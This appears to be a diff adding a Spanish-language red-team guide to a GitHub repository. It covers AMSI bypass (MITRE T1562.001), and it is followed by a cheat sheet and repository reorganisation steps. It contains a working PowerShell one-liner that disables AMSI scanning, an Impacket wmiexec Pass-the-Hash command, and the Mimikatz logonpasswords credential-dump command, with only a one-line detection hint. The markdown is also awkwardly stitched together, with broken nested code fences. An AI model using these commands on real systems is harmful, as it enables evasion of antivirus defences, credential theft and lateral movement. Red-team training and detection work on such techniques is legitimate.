@@ -1,0 +1,63 @@
+# AMSI Bypass Techniques (MITRE T1562.001)
+
+## 🔥 Métodos Actualizados (2024)
+1. **Patch en memoria** (PowerShell):
+```powershell
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+```
+2. **Obfuscación con XOR**:
+   - [Script ejemplo aquí](Tools/Scripts/AMSI-Bypass.ps1).
+
+## 🛡️ Detección
+- Monitorear eventos Windows `EventID 4688` (creación de procesos sospechosos).
+```
+
+**B. Archivo `/Resources/Cheatsheets.md`**  
+```markdown
+# Red Team Cheatsheets
+
+## Impacket
+```bash
+# Pass-The-Hash con wmiexec.py
+python3 wmiexec.py -hashes LMHASH:NTHASH DOMAIN/USER@TARGET_IP
+```
+
+## Mimikatz
+```cmd
+# Extraer hashes de memoria
+sekurlsa::logonpasswords
+```
+```
+
+---
+
+#### 🛡️ **3. Seguridad y Buenas Prácticas**
+1. **Eliminar archivos binarios/docx**:  
+   - Convierte los `.docx` a Markdown (usa [Pandoc](https://pandoc.org/)):  
+     ```bash
+     pandoc documento.docx -o documento.md
+     ```
+2. **Scrubber de metadatos**:  
+   - Usa `exiftool` para limpiar metadatos antes de subir archivos:  
+     ```bash
+     exiftool -all= *.docx
+     ```
+
+---
+
+### 🔄 **Cómo Implementarlo**
+1. **Clona tu repo localmente**:  
+   ```bash
+   git clone https://github.com/KevinDevSecOps/Redteam-t-cticos-byCK.git
+   cd Redteam-t-cticos-byCK
+   ```
+2. **Crea la nueva estructura**:  
+   ```bash
+   mkdir -p Resources Tools/Scripts
+   ```
+3. **Sube los cambios**:  
+   ```bash
+   git add .
+   git commit -m "reorg: Nueva estructura + AMSI bypass guide"
+   git push origin main
+   ```
